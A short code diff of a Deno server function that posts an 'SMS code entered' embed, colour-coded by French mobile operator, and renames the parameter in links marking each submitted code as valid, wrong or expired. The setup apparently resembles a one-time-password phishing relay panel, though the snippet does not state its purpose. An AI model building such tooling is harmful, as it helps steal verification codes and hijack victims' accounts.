@@ -17,9 +17,10 @@ Deno.serve(async (req) => {
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
   const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
 
-  const validUrl  = `${appUrl}/?result=valid&id=${submissionId}`;
-  const wrongUrl  = `${appUrl}/?result=wrong&id=${submissionId}`;
-  const expiredUrl = `${appUrl}/?result=expired&id=${submissionId}`;
+  // These links call triggerSendCode with the action param
+  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
+  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
 
   const embed = {
     title: "🔑 Code SMS entré",
